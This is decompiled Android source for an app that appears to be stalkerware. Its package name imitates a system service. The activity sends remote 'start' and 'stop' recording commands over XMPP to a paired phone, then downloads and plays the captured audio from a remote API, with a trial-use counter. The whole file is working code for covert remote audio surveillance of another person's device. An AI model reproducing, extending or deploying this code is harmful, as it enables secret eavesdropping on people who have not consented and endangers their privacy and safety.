package com.android.service.view;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import com.android.service.MainControlActivity;
import com.android.service.R;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PresenceType;
import com.xmpp.client.util.PushDialogModle;
import com.xmpp.client.util.ValueUtiles;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.jivesoftware.smack.XMPPException;
import org.jivesoftware.smack.packet.Message;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.json.JSONException;
import org.json.JSONObject;

public class AudioRecordView extends Activity implements Callback {
    public static ProgressDialog RecorderProgressDialog = null;
    private static final String TAG = "Recorder";
    public static Camera mCamera;
    public static boolean mPreviewRunning;
    public static SurfaceHolder mSurfaceHolder;
    public static SurfaceView mSurfaceView;
    /* access modifiers changed from: private */
    public AppPreferences _appPrefs;
    /* access modifiers changed from: private */
    public Button btnPlay;
    /* access modifiers changed from: private */
    public Button btnStart;
    /* access modifiers changed from: private */
    public Button btnStop;
    private HttpClinentModle hcm;
    private String hostname = "";
    private File myPlayFile;
    /* access modifiers changed from: private */
    public PushDialogModle pdm;
    /* access modifiers changed from: private */
    public String serVersion;
    /* access modifiers changed from: private */
    public String strDataPath = "";
    /* access modifiers changed from: private */
    public String strSelect_Mainnum = "";
    /* access modifiers changed from: private */
    public String strSelect_Pairnum = "";

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.camera_recorder);
        this.hostname = getString(R.string.hostname);
        this.btnPlay = (Button) findViewById(R.id.Play);
        this.btnStart = (Button) findViewById(R.id.StartService);
        this.btnStop = (Button) findViewById(R.id.StopService);
        this.btnStop.setEnabled(false);
        this.hcm = new HttpClinentModle(this);
        this.pdm = new PushDialogModle(this);
        this._appPrefs = new AppPreferences(this);
        this.strSelect_Mainnum = this._appPrefs.getMainnum();
        this.strSelect_Pairnum = this._appPrefs.getPairnum();
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        String serVersion_Got = this._appPrefs.getUserVersion();
        if (serVersion_Got == null || serVersion_Got.length() <= 0) {
            this.serVersion = ValueUtiles.UserVersion(this.hostname, this._appPrefs.getMainnum(), this._appPrefs.getpsw());
            this._appPrefs.saveUserVersion(this.serVersion);
        } else {
            this.serVersion = serVersion_Got;
        }
        if (getStatus(this.strSelect_Mainnum).booleanValue() && getStatus(this.strSelect_Pairnum).booleanValue()) {
            this.btnStart.setEnabled(true);
        } else {
            this.btnStart.setEnabled(false);
        }
        if (this.serVersion.equalsIgnoreCase("0")) {
            if (this._appPrefs.getCountRecord().equalsIgnoreCase("0")) {
                new Builder(this).setTitle("試用版此功能提供三次使用機會").setMessage("您已使用完三次的機會！！").setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        AudioRecordView.this.finish();
                    }
                }).show();
            } else {
                this._appPrefs.saveCountRecord("3");
                new Builder(this).setTitle("訊息通知").setMessage("試用版提供此功能三次的使用機會\n目前您剩下 " + this._appPrefs.getCountRecord() + " 次的使用機會").setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                }).show();
            }
        }
        this.btnStart.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                if (!AudioRecordView.this.serVersion.equalsIgnoreCase("0")) {
                    try {
                        if (!AudioRecordView.this.haveInternet()) {
                            AudioRecordView.this.btnStart.setEnabled(false);
                            if (MainControlActivity.statusMainImageObj != null) {
                                MainControlActivity.statusMainImageObj.setImageResource(R.drawable.offline);
                            }
                            if (MainControlActivity.statusPairImageObj != null) {
                                MainControlActivity.statusPairImageObj.setImageResource(R.drawable.offline);
                            }
                            AudioRecordView.this.pdm.showDialog("訊息", "目前有離線或是網路不穩的狀況");
                        } else if (!AudioRecordView.this.getStatus(AudioRecordView.this.strSelect_Mainnum).booleanValue()) {
                            AudioRecordView.this.btnStart.setEnabled(false);
                            if (MainControlActivity.statusMainImageObj != null) {
                                MainControlActivity.statusMainImageObj.setImageResource(R.drawable.offline);
                            }
                            AudioRecordView.this.pdm.showDialog("訊息", "目前有離線或是網路不穩的狀況");
                        } else if (AudioRecordView.this.getStatus(AudioRecordView.this.strSelect_Pairnum).booleanValue()) {
                            MainControlActivity.sendMsg = new Message();
                            MainControlActivity.sendMsg.setBody("start");
                            MainControlActivity.newChat.sendMessage(MainControlActivity.sendMsg);
                            AudioRecordView.this.btnStart.setEnabled(false);
                            AudioRecordView.this.btnStop.setEnabled(true);
                            AudioRecordView.this.btnPlay.setEnabled(false);
                            Toast.makeText(AudioRecordView.this.getBaseContext(), "錄音已開啟", 0).show();
                        } else {
                            AudioRecordView.this.btnStart.setEnabled(false);
                            if (MainControlActivity.statusPairImageObj != null) {
                                MainControlActivity.statusPairImageObj.setImageResource(R.drawable.offline);
                            }
                            AudioRecordView.this.pdm.showDialog("訊息", "目前有離線或是網路不穩的狀況");
                        }
                    } catch (XMPPException e) {
                        AudioRecordView.this.pdm.PushAlertSingleButton("連線訊息", "伺服器定期維護中，請稍候再試！！");
                    }
                } else if (AudioRecordView.this._appPrefs.getCountRecord().equalsIgnoreCase("0")) {
                    new Builder(AudioRecordView.this).setTitle("試用版此功能提供三次使用機會").setMessage("您已使用完三次的機會！！").setPositiveButton("確定", new OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            AudioRecordView.this.finish();
                        }
                    }).show();
                }
            }
        });
        this.btnStop.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                try {
                    MainControlActivity.sendMsg = new Message();
                    MainControlActivity.sendMsg.setBody("stop");
                    MainControlActivity.newChat.sendMessage(MainControlActivity.sendMsg);
                    AudioRecordView.this._appPrefs.saveCountRecord(String.valueOf(Integer.valueOf(AudioRecordView.this._appPrefs.getCountRecord()).intValue() - 1));
                    AudioRecordView.RecorderProgressDialog = new ProgressDialog(AudioRecordView.this);
                    AudioRecordView.RecorderProgressDialog.setMessage("上傳中... 請稍後!!");
                    AudioRecordView.RecorderProgressDialog.setProgressStyle(0);
                    AudioRecordView.RecorderProgressDialog.setCancelable(false);
                    AudioRecordView.RecorderProgressDialog.getWindow().setType(2003);
                    AudioRecordView.RecorderProgressDialog.show();
                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                Thread.sleep(30000);
                            } catch (Exception e) {
                                e.printStackTrace();
                            } finally {
                                AudioRecordView.RecorderProgressDialog.dismiss();
                            }
                        }
                    }).start();
                    AudioRecordView.this.btnStart.setEnabled(true);
                    AudioRecordView.this.btnStop.setEnabled(false);
                    AudioRecordView.this.btnPlay.setEnabled(true);
                } catch (XMPPException e) {
                    e.printStackTrace();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        });
        this.btnPlay.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                AudioRecordView.this.downloadfile(AudioRecordView.this.UpdataJasonAudioData());
                AudioRecordView.this.strDataPath = AudioRecordView.this._appPrefs.getDataPath();
                if (AudioRecordView.this.strDataPath.length() <= 0) {
                    AudioRecordView.this.strDataPath = ValueUtiles.getDataPath(AudioRecordView.this);
                }
                File recodeFile = new File(AudioRecordView.this.strDataPath, new StringBuilder(String.valueOf(AudioRecordView.this.strSelect_Pairnum)).append("recoder.mp3").toString());
                System.out.println("===檔案大小===" + recodeFile.length());
                AudioRecordView.this.openFile(recodeFile);
            }
        });
    }

    public String UpdataJasonAudioData() {
        String urlAPI = "http://monkey.tw885.com/API/GetAudio.ashx?phonenum=" + this.strSelect_Pairnum;
        System.out.println("urlAPI:" + urlAPI);
        String strJason = this.hcm.HttpClinentJason(urlAPI);
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                String strtime = json.getString("AddTime");
                return json.getString(Data.ELEMENT_NAME);
            }
            this.pdm.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
            return null;
        } catch (JSONException e) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append("-").append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
            return null;
        } catch (Exception e2) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append("-").append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
            return null;
        }
    }

    /* access modifiers changed from: protected */
    public void downloadfile(String aduiofile) {
        HttpClient client = new DefaultHttpClient();
        HttpGet request = new HttpGet();
        try {
            System.out.println("配對(對方)的編號->" + this.strSelect_Pairnum);
            System.out.println("hostname->" + this.hostname);
            this.strDataPath = this._appPrefs.getDataPath();
            if (this.strDataPath.length() <= 0) {
                this.strDataPath = ValueUtiles.getDataPath(this);
            }
            BufferedOutputStream bout = new BufferedOutputStream(new FileOutputStream(new File(this.strDataPath, this.strSelect_Pairnum + "recoder.mp3")));
            request.setURI(new URI("http://" + aduiofile));
            HttpResponse response = client.execute(request);
            StatusLine status = response.getStatusLine();
            Log.d("Test", "Statusline: " + status);
            Log.d("Test", "Statuscode: " + status.getStatusCode());
            HttpEntity entity = response.getEntity();
            Log.d("Test", "Length: " + entity.getContentLength());
            Log.d("Test", "type: " + entity.getContentType());
            entity.writeTo(bout);
            bout.flush();
            bout.close();
        } catch (IOException | URISyntaxException | ClientProtocolException e) {
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void openFile(File f) {
        Intent intent = new Intent();
        intent.addFlags(268435456);
        intent.setAction("android.intent.action.VIEW");
        intent.setDataAndType(Uri.fromFile(f), getMIMEType(f));
        startActivity(intent);
    }

    private String getMIMEType(File f) {
        String end = f.getName().substring(f.getName().lastIndexOf(".") + 1, f.getName().length()).toLowerCase();
        String type = "";
        if (end.equals("mp3") || end.equals("aac") || end.equals("aac") || end.equals("amr") || end.equals("mpeg") || end.equals("mp4")) {
            type = "audio";
        } else if (end.equals("jpg") || end.equals("gif") || end.equals("png") || end.equals("jpeg")) {
            type = "image";
        } else {
            type = "*";
        }
        return new StringBuilder(String.valueOf(type)).append("/*").toString();
    }

    public void surfaceCreated(SurfaceHolder holder) {
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
    }

    public void surfaceDestroyed(SurfaceHolder holder) {
    }

    /* access modifiers changed from: private */
    public boolean haveInternet() {
        NetworkInfo info = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        if (info == null) {
            return false;
        }
        if (info.isConnected()) {
            return true;
        }
        return false;
    }

    /* access modifiers changed from: private */
    public Boolean getStatus(String strTarget) {
        if (new PresenceType(this).GetPresenceType(strTarget).booleanValue()) {
            return Boolean.valueOf(true);
        }
        return Boolean.valueOf(false);
    }
}
